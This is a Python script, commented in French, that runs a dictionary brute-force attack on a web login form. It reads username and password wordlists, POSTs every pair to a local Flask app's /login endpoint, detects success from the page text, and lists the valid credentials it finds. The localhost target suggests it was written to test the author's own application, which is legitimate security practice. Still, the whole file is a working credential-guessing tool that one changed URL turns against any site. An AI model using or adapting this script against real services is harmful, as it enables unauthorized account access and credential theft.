import requests
import os # Importe le module os pour vérifier l'existence des fichiers

# L'URL de la page de connexion de votre application Flask
LOGIN_URL = "http://127.0.0.1:5000/login"

# Noms des fichiers contenant les wordlists
USERNAME_FILE = "usernames.txt"
PASSWORD_FILE = "passwords.txt"

# --- Fonction pour charger les mots/lignes d'un fichier ---
def load_wordlist(filepath):
    """
    Charge les lignes d'un fichier texte dans une liste,
    en nettoyant les espaces blancs et les lignes vides.
    """
    if not os.path.exists(filepath):
        print(f"Erreur : Le fichier '{filepath}' n'existe pas. Veuillez le créer.")
        return []
    
    with open(filepath, 'r', encoding='utf-8') as f:
        # Lire chaque ligne, enlever les espaces blancs (espaces, retours chariot)
        # et filtrer les lignes vides
        wordlist = [line.strip() for line in f if line.strip()]
    return wordlist

print(f"Démarrage du bruteforce sur {LOGIN_URL}")
print("-" * 30)

# Charger les wordlists
usernames = load_wordlist(USERNAME_FILE)
passwords = load_wordlist(PASSWORD_FILE)

# Vérifier si les listes sont vides
if not usernames:
    print("La liste des noms d'utilisateur est vide ou le fichier n'a pas pu être chargé. Abandon.")
    exit() # Quitte le script si la liste est vide
if not passwords:
    print("La liste des mots de passe est vide ou le fichier n'a pas pu être chargé. Abandon.")
    exit() # Quitte le script si la liste est vide

print(f"Chargé {len(usernames)} noms d'utilisateur et {len(passwords)} mots de passe.")
print("-" * 30)

found_credentials = []
attempt_count = 0

# Itération sur chaque nom d'utilisateur
for username in usernames:
    # Itération sur chaque mot de passe pour le nom d'utilisateur actuel
    for password in passwords:
        attempt_count += 1
        # Données à envoyer dans la requête POST
        data = {
            "username": username,
            "password": password
        }

        # Pour ne pas surcharger la console, on peut afficher la tentative seulement toutes les N tentatives
        # if attempt_count % 10 == 0 or attempt_count == 1: # Affiche la 1ère et toutes les 10 tentatives
        print(f"Tentative #{attempt_count} : username='{username}', password='{password}'")
        
        try:
            # Envoi de la requête POST
            response = requests.post(LOGIN_URL, data=data)

            # Vérification de la réponse du serveur
            if "Bienvenue," in response.text:
                print(f"🥳 SUCCÈS ! Identifiants trouvés : Username='{username}', Password='{password}'")
                found_credentials.append((username, password))
                # Optionnel : Si vous voulez arrêter après le premier succès, décommentez la ligne ci-dessous
                # break # Permet de sortir de la boucle des mots de passe (pour le mot de passe actuel)
            elif "Échec de connexion." in response.text:
                pass # Ne rien faire pour les échecs, ou décommenter la ligne ci-dessous pour voir tous les échecs
                # print(f"Échec pour {username}:{password}")
            else:
                # Gérer les réponses inattendues, comme les erreurs 400 Bad Request
                if "400 Bad Request" in response.text[:200]:
                    print(f"Réponse inattendue (400 Bad Request) pour {username}:{password}")
                else:
                    print(f"Réponse inattendue pour {username}:{password} : {response.text[:100]}...")

        except requests.exceptions.RequestException as e:
            print(f"Erreur de connexion lors de la tentative {username}:{password} : {e}")
            # En cas d'erreur réseau, il peut être utile de sortir ou de faire une pause
            # pour éviter de spammer le serveur ou d'être bloqué.
            # import time
            # time.sleep(5) # Pause de 5 secondes avant de réessayer
            # continue # Passe à la prochaine tentative

print("-" * 30)
if found_credentials:
    print(f"Bruteforce terminé. {len(found_credentials)} combinaison(s) d'identifiants trouvée(s) :")
    for creds in found_credentials:
        print(f"  Username: {creds[0]}, Password: {creds[1]}")
else:
    print("Bruteforce terminé. Aucune combinaison d'identifiants valide trouvée avec les listes fournies.")

print(f"Total des tentatives : {attempt_count}")